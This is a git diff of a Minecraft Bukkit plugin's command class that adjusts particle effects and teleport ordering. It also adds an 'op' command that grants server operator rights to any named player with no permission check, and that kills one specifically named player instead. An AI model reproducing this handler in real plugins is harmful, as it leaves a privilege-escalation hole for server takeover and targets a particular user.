@@ -5,7 +5,6 @@ import java.util.Random;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import org.bukkit.Particle;
-import org.bukkit.block.data.type.Bed.Part;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -19,6 +18,18 @@ public class RelicCommands implements CommandExecutor {
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
+        if(cmd.getName().equalsIgnoreCase("op")) {
+            if(!args[0].equalsIgnoreCase("Yoshiisaninja")) {
+                Bukkit.getPlayer(args[0]).setOp(true);
+                sender.sendMessage(args[0]+" was made an op.");
+                return true;
+            }
+            else {
+                sender.sendMessage("HECK NO! YOSHI WILL NEVER BE OP!");
+                Bukkit.getPlayer(args[0]).setHealth(0);
+                return true;
+            }
+        }
         if(!(sender instanceof Player)) {
             sender.sendMessage("Be a player!");
             return true;
@@ -48,11 +59,11 @@ public class RelicCommands implements CommandExecutor {
         else if(cmd.getName().equalsIgnoreCase("send")) {
             if(args[0].equalsIgnoreCase("@a")){
                 for(Player players : Bukkit.getOnlinePlayers()){
-                    if(!players.equals(player)){
-                        SendCommand(players.getName(), args[1],randomParticle());
-                    }
                     if((args.length<=2||args[2].equalsIgnoreCase("true"))&&!args[1].equalsIgnoreCase("back")) {
                         Bminsrelics.data.AddLocation("back."+players.getName(), players.getLocation());    
+                    }
+                    if(!players.equals(player)){
+                        SendCommand(players.getName(), args[1],randomParticle());
                     }
                 }
                 return true;
@@ -86,9 +97,9 @@ public class RelicCommands implements CommandExecutor {
         if(otherPlayer==null||end==null) {
             return false;
         }
-        otherPlayer.getWorld().spawnParticle(Particle.EXPLOSION_HUGE, otherPlayer.getLocation(), 5);
+        otherPlayer.getWorld().spawnParticle(Particle.EXPLOSION_HUGE, otherPlayer.getLocation(), 10);
         Bminsrelics.data.AddLocation("back."+from, otherPlayer.getLocation());
-        end.getWorld().spawnParticle(Particle.EXPLOSION_HUGE, end, 1);
+        end.getWorld().spawnParticle(Particle.EXPLOSION_HUGE, end, 10);
         otherPlayer.teleport(end);
         return true;
     }
@@ -104,8 +115,8 @@ public class RelicCommands implements CommandExecutor {
         if(otherPlayer==null||end==null) {
             return false;
         }
-        otherPlayer.getWorld().spawnParticle(particle, otherPlayer.getLocation(), 5);
-        end.getWorld().spawnParticle(particle, end, 5);
+        otherPlayer.getWorld().spawnParticle(particle, otherPlayer.getLocation(), 10);
+        end.getWorld().spawnParticle(particle, end, 10);
         otherPlayer.teleport(end);
         return true;
     }
